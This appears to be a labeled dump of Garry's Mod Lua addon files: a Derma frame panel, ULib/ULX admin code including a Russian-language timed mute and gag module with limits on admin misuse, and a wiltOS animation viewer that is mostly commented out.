		self:SetCursor('sizenwse')
		return
	end

	if ( self.Hovered && self.m_bSizable &&
		 mousex > (self.x + self:GetWide() - 20) &&
		 mousey > (self.y + self:GetTall() - 20)) then

		self:SetCursor('sizenwse')
		return
	end

	if (self.Hovered && self:GetDraggable() && mousey < (self.y + 24)) then
		self:SetCursor('sizeall')
		return
	end

	self:SetCursor('arrow')

	-- Don't allow the frame to go higher than 0
	if (self.y < 0) then
		self:SetPos(self.x, 0)
	end
end

function PANEL:Paint(w, h)
	if (self.m_bBackgroundBlur) then
		Derma_DrawBackgroundBlur(self, self.m_fCreateTime)
	end

	derma.SkinHook('Paint', 'Frame', self, w, h)

	if (self.TitleAnim) then
		local delta = math.Clamp((RealTime() - self.TitleAnim) / 0.7, 0, 1)
		self.TitleAnimDelta = delta

		derma.SkinHook('Paint', 'FrameTitleAnim', self, w, h)

		if (delta == 2) then
			self.TitleAnim = nil
			self.TitleAnimDelta = nil
		end
	end

	return true
end

function PANEL:PaintOver(w, h)
	derma.SkinHook('Paint', 'FrameLoading', self, w, h)
end

function PANEL:OnMousePressed()
	if (self.m_bSizable) then
		if (gui.MouseX() > (self.x + self:GetWide() - 20) &&
			gui.MouseY() > (self.y + self:GetTall() - 20)) then

			self.Sizing = { gui.MouseX() - self:GetWide(), gui.MouseY() - self:GetTall() }
			self:MouseCapture(true)
			return
		end
	end

	if (self:GetDraggable() && gui.MouseY() < (self.y + 24)) then
		self.Dragging = { gui.MouseX() - self.x, gui.MouseY() - self.y }
		self:MouseCapture(true)
		return
	end
end

function PANEL:OnMouseReleased()
	self.Dragging = nil
	self.Sizing = nil
	self:MouseCapture(false)
end

function PANEL:FadeIn(speed, cback)
	self.Anim = Derma_Anim('Fade Panel', self, function(panel, animation, delta, data)
		panel:SetAlpha(delta * 255)
		if (animation.Finished) then
			self.Anim = nil
			self.TitleAnim = RealTime() + 0.25
			if cback then cback() end
		end
	end)

	if (self.Anim) then
		self.Anim:Start(speed)
	end
end

function PANEL:FadeOut(speed, cback)
	self.Anim = Derma_Anim('Fade Panel', self, function(panel, animation, delta, data)
		panel:SetAlpha(255 - (delta * 255))
		if (animation.Finished) then
			self.Anim = nil
			if cback then cback() end
		end
	end)

	if (self.Anim) then
		self.Anim:Start(speed)
	end
end

function PANEL:SetLoading(isloading)
	self.ShowIsLoadingAnim = isloading
end

function PANEL:PerformLayout()
	self.lblTitle:SizeToContents()
	self.lblTitle:SetPos(8, 4)

	self.btnClose:SetPos(self:GetWide() - 30, 0)
	self.btnClose:SetSize(30, 30)
end

vgui.Register('ui_frame', PANEL, 'EditablePanel')


PANEL = vgui.GetControlTable('ui_frame')

local SetSize = PANEL.SetSize
PANEL.SetSize = function(self, w, h)
	if (w <= 1) then
		w = w * ScrW()
	end
	if (h <= 1) then
		h = h * ScrH()
	end
	SetSize(self, w, h)
end

local SetWide = PANEL.SetWide
PANEL.SetWide = function(self, w)
	if (w <= 1) then
		w = w * ScrH()
	end
	SetWide(self, w)
end

local SetTall = PANEL.SetTall
PANEL.SetTall = function(self, h)
	if (h <= 1) then
		h = h * ScrH()
	end
	SetTall(self, h)
end
--PATH addons/_adminmodules/lua/autorun/ulib_init.lua:
-- Short and sweet
if SERVER then
	include( "ulib/init.lua" )
else
	include( "ulib/cl_init.lua" )
end

--PATH addons/_adminmodules/lua/ulib/client/commands.lua:
--[[
	Function: redirect

	This redirects any command to the server.

	*DO NOT CALL DIRECTLY*

	Parameters:

		ply - The player using the command
		command - The command being used
		argv - The table of arguments
]]
function ULib.redirect( ply, command, argv )
	local totalArgv = table.Add( ULib.explode( " ", command ), argv )
	RunConsoleCommand( "_u", unpack( totalArgv ) )
end

--PATH addons/_adminmodules/lua/ulx/modules/cl/uteam.lua:
ulx.teams = ulx.teams or {}

function ulx.populateClTeams( teams )
	ulx.teams = teams

	for i=1, #teams do
		local team_data = teams[ i ]
		team.SetUp( team_data.index, team_data.name, team_data.color )
	end
end

--PATH addons/_adminmodules/lua/ulx/modules/sh/mutoid.lua:
CATEGORY_NAME = "Чат функции"
local tgaged = {}
local tmuted = {}

------------------------------ Psay ------------------------------
function ulx.psay( calling_ply, target_ply, message )
	if calling_ply:GetNW2Bool('TMuted', false) then 
		ULib.tsayError( calling_ply, "Вы заткнуты, и поэтому не можете писать!", true )
		return
	end

	ulx.fancyLog( { target_ply, calling_ply }, "#P написал вам #P: " .. message, calling_ply, target_ply )
end
local psay = ulx.command( CATEGORY_NAME, "ulx psay", ulx.psay, "!p", true )
psay:addParam{ type=ULib.cmds.PlayerArg, target="!^", ULib.cmds.ignoreCanTarget }
psay:addParam{ type=ULib.cmds.StringArg, hint="message", ULib.cmds.takeRestOfLine }
psay:defaultAccess( ULib.ACCESS_ALL )
psay:help( "Личное сообщение." )

local seeasayAccess = "ulx seeasay"
if SERVER then ULib.ucl.registerAccess( seeasayAccess, ULib.ACCESS_OPERATOR, "Ability to see 'ulx asay'", "Other" ) end -- Give operators access to see asays echoes by default

------------------------------ Tsay ------------------------------
function ulx.tsay( calling_ply, message )
	ULib.tsay( _, message )

	if ULib.toBool( GetConVarNumber( "ulx_logChat" ) ) then
		ulx.logString( string.format( "(tsay from %s) %s", calling_ply:IsValid() and calling_ply:Nick() or "Console", message ) )
	end
end
local tsay = ulx.command( CATEGORY_NAME, "ulx tsay", ulx.tsay, "@@", true, true )
tsay:addParam{ type=ULib.cmds.StringArg, hint="message", ULib.cmds.takeRestOfLine }
tsay:defaultAccess( ULib.ACCESS_ADMIN )
tsay:help( "Написать на весь сервер в чате." )

------------------------------ Csay ------------------------------
function ulx.csay( calling_ply, message )
	ULib.csay( _, message )

	if ULib.toBool( GetConVarNumber( "ulx_logChat" ) ) then
		ulx.logString( string.format( "(csay from %s) %s", calling_ply:IsValid() and calling_ply:Nick() or "Console", message ) )
	end
end
local csay = ulx.command( CATEGORY_NAME, "ulx csay", ulx.csay, "@@@", true, true )
csay:addParam{ type=ULib.cmds.StringArg, hint="message", ULib.cmds.takeRestOfLine }
csay:defaultAccess( ULib.ACCESS_ADMIN )
csay:help( "Написать на весь сервер перед лицом у всех." )

------------------------------ Mute ------------------------------
function ulx.tmute( calling_ply, target_plys, sec, reason, should_unmute )
	local v = target_plys
	for k ,ve in pairs(tmuted) do
		if ve == v:SteamID64() then
			v:SetNW2Bool("TMuted",true)
		end
	end
	if should_unmute then
		ulx.fancyLogAdmin( calling_ply, "#A разрешил писать #T", target_plys )
		table.RemoveByValue(tmuted,v:SteamID64())
		v:SetNW2Bool("TMuted",false)
	else
		ulx.fancyLogAdmin( calling_ply, "#A запретил писать #T на ".. sec .. " сек. Причина: " .. reason, target_plys )
		table.insert(tmuted,v:SteamID64())
		v:SetNW2Bool("TMuted",true)
		local stidpid = v:SteamID64()
		timer.Simple(sec,function()
			for k ,ve in pairs(tmuted) do
				if ve == stidpid then
					table.RemoveByValue(tmuted,stidpid)
					for _, pl in player.Iterator() do
						if pl:SteamID64() == stidpid then
							pl:SetNW2Bool("TMuted",false)
							pl:ChatPrint("Ваш мут прошел.")
						end
					end
				end
			end
		end)
	end
	
	
    tblCountMuteLimit = tblCountMuteLimit or {}
	tblCountMuteLimit[calling_ply] = tblCountMuteLimit[calling_ply] and tblCountMuteLimit[calling_ply] or 0
	
	tblCountMute = tblCountMute or {}
    tblCountMute[calling_ply] = tblCountMute[calling_ply] and tblCountMute[calling_ply] or 0
    tblCountMute[calling_ply] = tblCountMute[calling_ply] + 1
	
    if tblCountMute and tblCountMute[calling_ply] > 6 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"tmute")
        ulx.removeuser( nil, calling_ply )
    end

	if tblCountMuteLimit and tblCountMuteLimit[calling_ply] > 25 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"tmute_limit > 25 | 1800 sec")
        ulx.removeuser( nil, calling_ply )
    end
	
    if !timer.Exists(calling_ply:UserID().."tblCountMute") then
		timer.Create(calling_ply:UserID().."tblCountMute",60,1, function()   
			if tblCountMute[calling_ply] == nil then return end
			tblCountMuteLimit[calling_ply] = tonumber(tblCountMuteLimit[calling_ply]) + tonumber(tblCountMute[calling_ply])
			tblCountMute[calling_ply] = nil
		end)
	end
	
	if !timer.Exists(calling_ply:UserID().."tblCountMute_") then
		timer.Create(calling_ply:UserID().."tblCountMute_",1800,1, function()   
			tblCountMuteLimit[calling_ply] = nil
		end)
	end
	
end
local tmute = ulx.command( CATEGORY_NAME, "ulx tmute", ulx.tmute, "!tmute" )
tmute:addParam{ type=ULib.cmds.PlayerArg, target="!^", ULib.cmds.ignoreCanTarget }
tmute:addParam{ type=ULib.cmds.NumArg, min=1, default=1, hint="Секунды", ULib.cmds.round, ULib.cmds.optional }
tmute:addParam{ type=ULib.cmds.StringArg, hint="причина не указана", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
tmute:addParam{ type=ULib.cmds.BoolArg, invisible=true }
tmute:defaultAccess( ULib.ACCESS_ADMIN )
tmute:help( "Запретить писать в чат игроку (игрокам) на время." )
tmute:setOpposite( "ulx untmute", {_, _, _, _, true}, "!untmute" )

if SERVER then
	local function TMute( ply, strText )
		if ply:GetNW2Bool("TMuted") == true then
			ply:ChatPrint("На вас наложен эффект мута.")
			return ''
		end
	end
	hook.Add( "PlayerSay", "TMute", TMute )
end

------------------------------ Gag ------------------------------
function ulx.tgag( calling_ply, target_plys, sec, reason, should_ungag )
	local v = target_plys
	for k ,ve in pairs(tgaged) do
		if ve == v:SteamID64() then
			v:SetNW2Bool("TGag",true)
		end
	end
	if should_ungag then
		ulx.fancyLogAdmin( calling_ply, "#A разрешил говорить #T", target_plys )
		table.RemoveByValue(tgaged,v:SteamID64())
		v:SetNW2Bool("TGag",false)
	else
		ulx.fancyLogAdmin( calling_ply, "#A запретил говорить #T на ".. sec .. " сек. Причина: " .. reason, target_plys )
		table.insert(tgaged,v:SteamID64())
		v:SetNW2Bool("TGag",true)
		local stidpid = v:SteamID64()
		timer.Simple(sec,function()
			for k ,ve in pairs(tgaged) do
				if ve == stidpid then
					table.RemoveByValue(tgaged,stidpid)
					for _, pl in player.Iterator() do
						if pl:SteamID64() == stidpid then
							pl:SetNW2Bool("TGag",false)
							pl:ChatPrint("Ваш gag прошел.")
						end
					end
				end
			end
		end)
	end
	
	
    tblCountTgagLimit = tblCountTgagLimit or {}
	tblCountTgagLimit[calling_ply] = tblCountTgagLimit[calling_ply] and tblCountTgagLimit[calling_ply] or 0
	
	tblCountTgag = tblCountTgag or {}
    tblCountTgag[calling_ply] = tblCountTgag[calling_ply] and tblCountTgag[calling_ply] or 0
    tblCountTgag[calling_ply] = tblCountTgag[calling_ply] + 1
	
    if tblCountTgag and tblCountTgag[calling_ply] > 6 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"tgag")
        ulx.removeuser( nil, calling_ply )
    end

	if tblCountTgagLimit and tblCountTgagLimit[calling_ply] > 25 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"tgag_limit > 25 | 1800 sec")
        ulx.removeuser( nil, calling_ply )
    end
	
    if !timer.Exists(calling_ply:UserID().."tblCountTgag") then
		timer.Create(calling_ply:UserID().."tblCountTgag",60,1, function()   
			if tblCountTgag[calling_ply] == nil then return end
				tblCountTgagLimit[calling_ply] = tonumber(tblCountTgagLimit[calling_ply]) + tonumber(tblCountTgag[calling_ply])
				tblCountTgag[calling_ply] = nil
		end)
	end
	
	if !timer.Exists(calling_ply:UserID().."tblCountTgag_") then
		timer.Create(calling_ply:UserID().."tblCountTgag_",1800,1, function()   
			tblCountTgagLimit[calling_ply] = nil
		end)
	end
	
end
local tgag = ulx.command( CATEGORY_NAME, "ulx tgag", ulx.tgag, "!tgag" )
tgag:addParam{ type=ULib.cmds.PlayerArg, target="!^", ULib.cmds.ignoreCanTarget}
tgag:addParam{ type=ULib.cmds.NumArg, min=1, default=1, hint="Секунды", ULib.cmds.round, ULib.cmds.optional }
tgag:addParam{ type=ULib.cmds.StringArg, hint="причина не указана", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
tgag:addParam{ type=ULib.cmds.BoolArg, invisible=true }
tgag:defaultAccess( ULib.ACCESS_ADMIN )
tgag:help( "Запретить говорить игроку(игрокам) на время." )
tgag:setOpposite( "ulx untgag", {_, _, _, _, true}, "!untgag" )

-- Таблица для кеширования состояния глушения
local gagStates = {}

-- Функция для обновления кеша всех игроков
local function updateAllGagStates()
	gagStates = {}
    for _, ply in player.Iterator() do
        if IsValid(ply) then
			if ply:GetNW2Bool("TGag") == true then
				gagStates[ply] = true
			else
				gagStates[ply] = false
			end
        end
    end
end

-- Таймер для периодического обновления состояний
if SERVER then
	timer.Create("UpdateGagStatesTimer", 2, 0, updateAllGagStates)
end
-- Использование кешированных данных в хуке PlayerCanHearPlayersVoice
local function gagHook(listener, talker)
    if gagStates[talker] then
        return false
    end
end

hook.Add("PlayerCanHearPlayersVoice", "ULXTGag", gagHook)

hook.Add("PlayerInitialSpawn","ReturnMuteAndGag",function(ply)
	for k ,ve in pairs(tmuted) do
		if ve == ply:SteamID64() then
	        ply:SetNW2Bool("TMuted",true)
	        ply:ChatPrint("Мы вернули ваш мут.")
		end
	end
	for k ,ve in pairs(tgaged) do
		if ve == ply:SteamID64() then
	        ply:SetNW2Bool("TGag",true)
	        ply:ChatPrint("Мы вернули ваш gag.")
		end
	end
end)
--PATH addons/animation/lua/wos/anim_extension/extensions/wos_famdance.lua:
--[[-------------------------------------------------------------------
	wiltOS Animation Extension Register:
		Prints some feedback saying the Animation Extension successfully loaded.
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
-------------------------------------------------------------------]]--[[
							  
	Lua Developer: King David
	Contact: http://steamcommunity.com/groups/wiltostech
		
----------------------------------------]]--

wOS.AnimExtension.Mounted[ "Familiar Dances" ] = true
-- MsgC( Color( 255, 255, 255 ), "[wOS] Successfully mounted animation extension: Familiar Dances\n" )
--PATH addons/animation/lua/wos/anim_extension/vgui/wiltos_anim_viewer.lua:
-- [[-------------------------------------------------------------------
	-- wiltOS Animation Viewer:
		-- A Supplement to the animation base, it allows you to view more than	
					-- 2000 animations/sequences with it's model viewer
			-- Powered by
						  -- _ _ _    ___  ____  
				-- __      _(_) | |_ / _ \/ ___| 
				-- \ \ /\ / / | | __| | | \___ \ 
				 -- \ V  V /| | | |_| |_| |___) |
				  -- \_/\_/ |_|_|\__|\___/|____/ 
											  
 -- _____         _                 _             _           
-- |_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  -- | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  -- | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  -- |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         -- |___/             
-----------------------------------------------------------]]
--[[
							  
	-- Lua Developer: King David
	-- Contact: http://steamcommunity.com/groups/wiltostech
		
--------------------------------------]]--
-- wOS = wOS or {}

-- local w, h = ScrW(), ScrH()

-- surface.CreateFont( "wOS.Anim.TitleFont", {
	-- font = "Roboto Cn", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
	-- extended = false,
	-- size = 24*(h/1200),
	-- weight = 1000,
	-- blursize = 0,
	-- scanlines = 0,
	-- antialias = true,
	-- underline = false,
	-- italic = false,
	-- strikeout = false,
	-- symbol = false,
	-- rotary = false,
	-- shadow = false,
	-- additive = false,
	-- outline = false,
-- } )

-- surface.CreateFont( "wOS.Anim.DescFont",{
	-- font = "Roboto Cn", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
	-- extended = false,
	-- size = 18*(h/1200),
	-- weight = 500,
	-- blursize = 0,
	-- scanlines = 0,
	-- antialias = true,
	-- underline = false,
	-- italic = false,
	-- strikeout = false,
	-- symbol = false,
	-- rotary = false,
	-- shadow = false,
	-- additive = false,
	-- outline = false,
-- } )

-- list.Add( "DesktopWindows", {
	-- icon = "wos/anim_extension/emblem.png",
	-- title = "wiltOS Viewer",
	-- init = function() wOS:OpenAnimationMenu() end,
-- })

-- function wOS:OpenAnimationMenu()

	-- if self.OverFrame then 
		-- self.OverFrame:Remove()
		-- self.OverFrame = nil
		-- gui.EnableScreenClicker( false )
		-- return 
	-- end

	-- self.OverFrame = vgui.Create( "DFrame" )
	-- self.OverFrame:SetSize( w, h )
	-- self.OverFrame:Center()
	-- self.OverFrame.Paint = function() end
	-- self.OverFrame:SetTitle( "" )
	-- self.OverFrame:ShowCloseButton( false )
	-- self.OverFrame:SetDraggable( false )
	
	-- gui.EnableScreenClicker( true )
	-- self.AnimMenu = vgui.Create( "DFrame", self.OverFrame )
	-- self.AnimMenu:SetSize( w*0.5, h*0.5 )
	-- self.AnimMenu:Center()
	-- self.AnimMenu.Display = LocalPlayer():GetModel()
	-- self.AnimMenu:MakePopup()
	-- self.AnimMenu:SetTitle( "" )
	-- self.AnimMenu:ShowCloseButton( false )
	-- self.AnimMenu:SetDraggable( false )
	
	-- local fw, fh = self.AnimMenu:GetSize()
	-- local padx = fh*0.025
	-- local pady = padx
	
	-- local modelmenu = vgui.Create( "DAdjustableModelPanel", self.AnimMenu )
	-- modelmenu:SetPos( padx, pady )
	-- modelmenu:SetSize( fw/2 - padx - padx/2, fh - 2*pady )
	-- modelmenu.LayoutEntity = function() local ent = modelmenu:GetEntity() ent:SetEyeTarget( modelmenu:GetCamPos() ) ent:FrameAdvance( FrameTime() ) end
	
	-- self.AnimMenu.Paint = function( pan, ww, hh )
		-- if not vgui.CursorVisible() then gui.EnableScreenClicker( true ) end
		-- draw.RoundedBox( 3, 0, 0, ww, hh, Color( 25, 25, 25, 245 ) )
		-- draw.SimpleText( "Animation Viewer", "wOS.Anim.TitleFont", ww/2, hh*0.05, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )	
		-- surface.SetDrawColor( Color( 0, 155, 155, 255 ) )
		-- surface.DrawOutlinedRect( padx, pady, modelmenu:GetWide(), modelmenu:GetTall() )
	-- end 
		
	-- local lister = vgui.Create( "DListView", self.AnimMenu )
	-- lister:SetPos( fw/2 + padx/2, pady )
	-- lister:SetSize( fw/2 - padx - padx/2, fh*0.77 - pady)	
	-- lister:AddColumn( "Name" )
	-- lister:SetMultiSelect( false )
	-- lister:SetHideHeaders( true )
	-- lister.Pages = {}
	-- lister.CurrentPage = 1
	
	-- function lister:Think()
		-- if wOS.AnimMenu.Display != modelmenu:GetModel() then
			-- modelmenu:RebuildModel()
		-- end	
	-- end
	
	-- function lister:RebuildCache( ent )
		-- lister:Clear()
		-- lister.Pages = {}
		-- lister.CurrentPage = 1
		-- local max = 500
		-- local count = 0
		-- local curpage = 1
		-- for k, v in SortedPairsByValue( ent:GetSequenceList() ) do
			-- if not lister.Pages[ curpage ] then lister.Pages[ curpage ] = {} end
			-- if count < max then
				-- table.insert( lister.Pages[ curpage ], string.lower( v ) )
				-- if curpage == 1 then
					-- local line = lister:AddLine( string.lower( v ) )
					-- line.OnSelect = function()
						-- ent:ResetSequence( v )
						-- ent:SetCycle( 0 )
						
					-- end
				-- end
				-- count = count + 1
			-- else
				-- curpage = curpage + 1
				-- count = 0
			-- end
		-- end
	-- end
	
	-- function lister:ChangePage( page )
		-- lister:Clear()
		-- if not page then return end	
		-- if not lister.Pages[ page ] then return end
		-- local ent = modelmenu:GetEntity()
		-- for k, v in pairs( lister.Pages[ page ] ) do
			-- local line = lister:AddLine( string.lower( v ) )
			-- line.OnSelect = function()
				-- ent:ResetSequence( v )
				-- ent:SetCycle( 0 )
			-- end
		-- end
	-- end
	
	-- function modelmenu:RebuildModel()
		-- modelmenu:SetModel( wOS.AnimMenu.Display )
		-- local ent = modelmenu:GetEntity()
		-- local pos = ent:GetPos()
		-- local campos = pos + Vector( -150, 0, 0 )
		-- modelmenu:SetCamPos( campos )
		-- modelmenu:SetFOV( 45 )
		-- modelmenu:SetLookAng( ( campos * -1 ):Angle() )
		-- lister:RebuildCache( modelmenu:GetEntity() )
	-- end
	
	-- local nextbutt = vgui.Create( "DButton", self.AnimMenu )
	-- nextbutt:SetSize( fw*0.15, fh*0.05 )
	-- nextbutt:SetPos( fw*0.85 - padx, fh*0.77 + 2*pady )
	-- nextbutt:SetText( "" )
	-- nextbutt.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "NEXT PAGE", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	-- nextbutt.DoClick = function( pan )
		-- lister.CurrentPage = math.Clamp( lister.CurrentPage + 1, 1, #lister.Pages )
		-- lister:ChangePage( lister.CurrentPage )
	-- end
	
	-- local prevbutt = vgui.Create( "DButton", self.AnimMenu )
	-- prevbutt:SetSize( fw*0.15, fh*0.05 )
	-- prevbutt:SetPos( fw/2 + padx/2, fh*0.77 + 2*pady )
	-- prevbutt:SetText( "" )
	-- prevbutt.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "PREVIOUS PAGE", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	-- prevbutt.DoClick = function( pan )
		-- lister.CurrentPage = math.Clamp( lister.CurrentPage - 1, 1, #lister.Pages )
		-- lister:ChangePage( lister.CurrentPage )
	-- end
	
	-- local replaybutt = vgui.Create( "DButton", self.AnimMenu )
	-- replaybutt:SetSize( fw*0.15, fh*0.05 )
	-- replaybutt:SetPos( fw/2 + padx/2 + fw*0.15 + padx, fh*0.77 + 2*pady )
	-- replaybutt:SetText( "" )
	-- replaybutt.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "REPLAY SELECTION", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	-- replaybutt.DoClick = function( pan )
		-- local selected = lister:GetSelectedLine()
		-- if not selected then return end
		-- local ent = modelmenu:GetEntity()
		-- ent:ResetSequence( lister:GetLines()[ selected ]:GetValue( 1 ) )
		-- ent:SetCycle( 0 )		
	-- end
	
	-- local closebutt = vgui.Create( "DButton", self.AnimMenu )
	-- closebutt:SetSize( fw*0.3, fh*0.05 )
	-- closebutt:SetPos( fw/2 + fw*0.1, fh*0.95 - pady )
	-- closebutt:SetText( "" )
	-- closebutt.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "CLOSE MENU", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	-- closebutt.DoClick = function( pan )
		-- wOS:OpenAnimationMenu()	
	-- end
	
	-- local mw, mh = modelmenu:GetSize()
	
	-- local infoframe = vgui.Create( "DPanel", modelmenu )
	-- infoframe:SetSize( mw, mh*0.2 )
	-- infoframe:SetPos( 0, mh*0.8 )
	-- infoframe.Paint = function( pan, ww, hh )
		-- if not lister:GetLines()[ lister:GetSelectedLine() ] then return end
		-- local title = lister:GetLines()[ lister:GetSelectedLine() ]:GetValue( 1 )
		-- local ent = modelmenu:GetEntity()
		-- local act = ent:LookupSequence( title )
		-- draw.SimpleText( "SEQUENCE: " .. title, "wOS.Anim.DescFont", ww/2, hh*0.25, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		-- if act then
			-- local actn = ent:GetSequenceActivityName( act )
			-- act = ent:GetSequenceActivity( act )
			-- if not act then 
				-- draw.SimpleText( "ACT ID: NONE", "wOS.Anim.DescFont", ww/2, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			-- else
				-- draw.SimpleText( "ACT ID: " .. act, "wOS.Anim.DescFont", ww/2, hh*0.5, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			-- end
			-- if not actn then 
				-- draw.SimpleText( "ACT NAME: N/A", "wOS.Anim.DescFont", ww/2, hh*0.75, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			-- else
				-- draw.SimpleText( "ACT NAME: " .. actn, "wOS.Anim.DescFont", ww/2, hh*0.75, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			-- end
		-- end	
	-- end
	
	-- local holdframe = vgui.Create( "DFrame", self.OverFrame )
	-- holdframe:SetSize( fw*0.3, fh*0.1 )
	-- holdframe:SetPos( fw*1.5 + fw*0.01, fh - fh/2 )
	-- holdframe:SetText( "" )
	-- holdframe:SetTitle( "" )
	-- holdframe:ShowCloseButton( false )
	-- holdframe:SetDraggable( false )
	-- holdframe.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 3, 0, 0, ww, hh, Color( 25, 25, 25, 245 ) )
	-- end
	-- holdframe.Think = function( pan )
		-- local endy = fh*0.1
		-- if pan.Expand then
			-- endy = fh
		-- end
		-- pan:SetTall( math.Approach( pan:GetTall(), endy, 15 ) )
	-- end
	-- holdframe.Expand = false
	-- holdframe:MakePopup()
	
	-- local iw, ih = holdframe:GetSize()
	
	-- local togglebutt = vgui.Create( "DButton", holdframe )
	-- togglebutt:SetSize( iw*0.9, fh*0.05 )
	-- togglebutt:SetPos( iw*0.05, ih - fh*0.075 )
	-- togglebutt:SetText( "" )
	-- togglebutt.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( ( holdframe.Expand and "Close Holdtype Creator" ) or "Open Holdtype Creator", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	
	-- local ACTS = { 
		-- [ "Idle Standing" ] = "ACT_MP_STAND_IDLE", 
		-- [ "Walk Standing" ] = "ACT_MP_WALK", 
		-- [ "Running" ] = "ACT_MP_RUN", 
		-- [ "Idle Crouching" ] = "ACT_MP_CROUCH_IDLE", 
		-- [ "Walk Crouching" ] = "ACT_MP_CROUCHWALK", 
		-- [ "Attack Standing" ] = "ACT_MP_ATTACK_STAND_PRIMARYFIRE",
		-- [ "Attack Crouching" ] = "ACT_MP_ATTACK_CROUCH_PRIMARYFIRE",
		-- [ "Reload Standing" ] = "ACT_MP_RELOAD_STAND",
		-- [ "Reload Crouching" ] = "ACT_MP_RELOAD_CROUCH",
		-- [ "Reload Crouching" ] = "ACT_MP_JUMP",
		-- [ "Swimming" ] = "ACT_MP_SWIM",
		-- [ "Jumping" ] = "ACT_MP_JUMP",
		-- [ "Landing" ] = "ACT_LAND",
	-- }
	
	-- local title = vgui.Create( "DLabel", holdframe )
	-- title:SetSize( iw*0.8, fh*0.05 )
	-- title:SetPos( iw*0.05, ih )
	-- title:SetText( "Base Holdtype:" )
	-- title:SetFont( "wOS.Anim.TitleFont" )
	
	-- local basetype = vgui.Create( "DTextEntry", holdframe )
	-- basetype:SetSize( iw*0.8, fh*0.03 )
	-- basetype:SetPos( iw*0.05, ih + fh*0.05 )
	
	-- local baselist = vgui.Create( "DImageButton", holdframe )
	-- baselist:SetSize( fh*0.03, fh*0.03 )
	-- baselist:SetPos( iw*0.86, ih + fh*0.05 )
	-- baselist:SetImage( "icon16/application_view_list.png" )	
	-- baselist.DoClick = function( pan )
		-- if pan.ItemIconOptions then pan.ItemIconOptions:Remove() pan.ItemIconOptions = nil end
		-- pan.ItemIconOptions = DermaMenu( baselist )
		-- pan.ItemIconOptions:MakePopup()
		-- pan.ItemIconOptions:SetPos( gui.MouseX(), gui.MouseY() )
		-- pan.ItemIconOptions.Think = function( self )
			-- if not pan then self:Remove() end
		-- end
		-- local holdlist = { "pistol", "smg", "grenade", "ar2", "shotgun", "rpg", "physgun", "crossbow", "melee", "slam", "normal", "fist", "melee2", "passive", "knife", "duel", "camera", "magic", "revolver" }
		-- for name, _ in pairs( wOS.AnimExtension.TranslateHoldType ) do
			-- table.insert( holdlist, name )
		-- end
		-- for _, typ in ipairs( holdlist ) do
			-- pan.ItemIconOptions:AddOption( typ, function( self ) 
				-- basetype:SetText( typ )
				-- self:Remove()
			-- end )
		-- end			
	-- end
	
	-- local title = vgui.Create( "DLabel", holdframe )
	-- title:SetSize( iw*0.9, fh*0.05 )
	-- title:SetPos( iw*0.05, ih + fh*0.09 )
	-- title:SetText( "Holdtype Name:" )
	-- title:SetFont( "wOS.Anim.TitleFont" )
	
	-- local nametext = vgui.Create( "DTextEntry", holdframe )
	-- nametext:SetSize( iw*0.9, fh*0.03 )
